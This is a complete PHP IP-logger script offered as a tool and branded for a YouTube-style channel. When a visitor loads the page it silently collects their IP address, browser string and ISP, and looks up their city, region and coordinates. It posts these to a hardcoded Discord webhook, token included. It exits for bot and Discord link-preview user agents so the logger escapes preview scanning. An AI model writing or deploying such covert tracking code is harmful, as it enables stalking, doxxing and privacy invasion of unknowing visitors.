<?php
 
$webhookurl = "https://canary.discord.com/api/webhooks/953349507612024874/SMt6vbH7NjB-_rUR9-C35HoR4erkPX5SJU9W7ZK6t4e3VLtS0dzHxdWJRrxK64NLKgPX"; // Paste your webhook between the quotes
 
 
$TheirDate = date('d/m/Y');
$TheirTime = date('G:i:s');
$timestamp = date("c", strtotime("now"));
$ip= $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];
$Curl = curl_init("http://ip-api.com/json/$ip"); //Get the info of the IP using Curl
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
$Info = json_decode(curl_exec($Curl)); 
curl_close($Curl);
 
if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $Browser)) {
    exit();
} // prevents bot detection
 
$ISP = $Info->isp;
$Country = $Info->country;
$Region = $Info->regionName;
$City = $Info->city;
$COORD = "$Info->lat, $Info->lon"; // Coordinates
 
$timestamp = date("c", strtotime("now"));
 
$json_data = json_encode([
    // Message
    "content" => "",
 
    // Username
    "username" => "IP Logger | Made By Script Mattyeh",
 
    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "Script Mattyeh IP Logger",
 
            // Embed Type
            "type" => "rich",
 
 
 
            // Timestamp of embed must be formatted as ISO8601
            "timestamp" => $timestamp,
 
            // Embed left border color in HEX
            "color" => hexdec( "ff9933" ),
 
            // Footer
            "footer" => [
                "text" => "Subscribe to Script Mattyeh",
                "icon_url" => "https://i.vgy.me/WBrIqy.png?size=375"
            ],
 
            // Thumbnail
            //"thumbnail" => [
            //    "url" => "https://i.vgy.me/Lzqvsr.png?size=600"
            //],
 
            // Author
            "author" => [
            ],
 
            // Field array of objects
            "fields" => [
                // Field 1
                [
                    "name" => "IP",
                    "value" => "$ip",
                    "inline" => true
                ],
                // Field 2
                [
                    "name" => "Location",
                    "value" => "$City, $Region",
                    "inline" => true
                ],
                // Field 3
                [
                    "name" => "Country",
                    "value" => "$Country",
                    "inline" => true
                ],
                // Field 4
                [
                    "name" => "ISP",
                    "value" => "$ISP",
                    "inline" => false
                ],
                // Field 5
                [
                    "name" => "Coordinates",
                    "value" => "$COORD",
                    "inline" => false
                ],
                // Field 1.5
                [
                    "name" => "Date & Time",
                    "value" => "$TheirDate | $TheirTime",
                    "inline" => true
                ],
                // Field 6
                [
                    "name" => "Browser Info",
                    "value" => "$Browser",
                    "inline" => false
                ]
 
            ]
        ]
    ]
 
 
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
 
 
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
 
$response = curl_exec( $ch );
curl_close( $ch );